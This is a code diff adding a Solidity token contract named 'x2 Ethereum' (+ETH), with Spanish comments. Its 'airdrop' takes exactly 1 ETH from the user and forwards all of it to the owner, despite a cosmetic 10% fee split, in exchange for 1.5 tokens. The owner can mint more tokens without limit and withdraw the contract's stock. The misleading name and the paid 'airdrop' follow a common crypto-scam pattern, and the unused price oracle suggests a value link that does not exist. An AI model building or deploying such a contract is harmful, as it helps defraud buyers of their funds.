@@ -1,0 +1,72 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+
+contract x2Ethereum is ERC20, Ownable {
+    uint256 public constant INITIAL_SUPPLY = 50_000_000 * 10**18; // 50 millones de tokens con 18 decimales
+    uint256 public constant AIRDROP_AMOUNT = 1_500_000_000_000_000_000; // 1.5 x2Ethereum (1.5 * 10^18)
+    uint256 public constant REQUIRED_ETH = 1 ether; // 1 ETH requerido para el airdrop
+    uint256 public constant FEE_PERCENT = 10; // Comisión del 10%
+    uint256 public constant FEE_AMOUNT = REQUIRED_ETH * FEE_PERCENT / 100; // 0.1 ETH
+
+    AggregatorV3Interface internal priceFeed; // Oráculo para ETH/USD
+    address public constant SEPOLIA_PRICE_FEED = 0x694AA1769357215DE4FAC081bf1f309aDC325306;
+
+    constructor() ERC20("x2 Ethereum", "+ETH") Ownable(msg.sender) {
+        priceFeed = AggregatorV3Interface(SEPOLIA_PRICE_FEED);
+        _mint(address(this), INITIAL_SUPPLY); // Tokens iniciales se mintean al contrato
+    }
+
+    // Función para que el propietario cree más tokens
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    // Función para obtener el precio actual de ETH en USD desde el oráculo
+    function getLatestETHPrice() public view returns (int) {
+        (
+            /* uint80 roundID */,
+            int price,
+            /* uint startedAt */,
+            /* uint timeStamp */,
+            /* uint80 answeredInRound */
+        ) = priceFeed.latestRoundData();
+        return price; // Precio con 8 decimales (ej: 300000000000 para $3000)
+    }
+
+    // Función de airdrop: usuario envía 1 ETH, paga 10% de comisión, recibe 1.5 x2Ethereum
+    function airdrop() public payable {
+        require(msg.value == REQUIRED_ETH, "Must send exactly 1 ETH");
+        require(balanceOf(address(this)) >= AIRDROP_AMOUNT, "Contract lacks sufficient x2Ethereum for airdrop");
+
+        // Calcula la cantidad después de la comisión
+        uint256 amountAfterFee = msg.value - FEE_AMOUNT; // 0.9 ETH
+        uint256 fee = FEE_AMOUNT; // 0.1 ETH
+
+        // Transfiere la comisión (0.1 ETH) y el resto (0.9 ETH) al propietario
+        (bool sentFee, ) = payable(owner()).call{value: fee}("");
+        require(sentFee, "Failed to send fee to owner");
+        (bool sentRest, ) = payable(owner()).call{value: amountAfterFee}("");
+        require(sentRest, "Failed to send remaining ETH to owner");
+
+        // Transfiere 1.5 x2Ethereum al usuario
+        _transfer(address(this), msg.sender, AIRDROP_AMOUNT);
+    }
+
+    // Define 18 decimales, igual que Ethereum
+    function decimals() public pure override returns (uint8) {
+        return 18;
+    }
+
+    // Función para que el propietario retire tokens del contrato
+    function withdrawTokens(uint256 amount) public onlyOwner {
+        require(balanceOf(address(this)) >= amount, "Insufficient tokens in contract");
+        _transfer(address(this), msg.sender, amount);
+    }
+
+    // Función para recibir ETH directamente
+    receive() external payable {}
+}
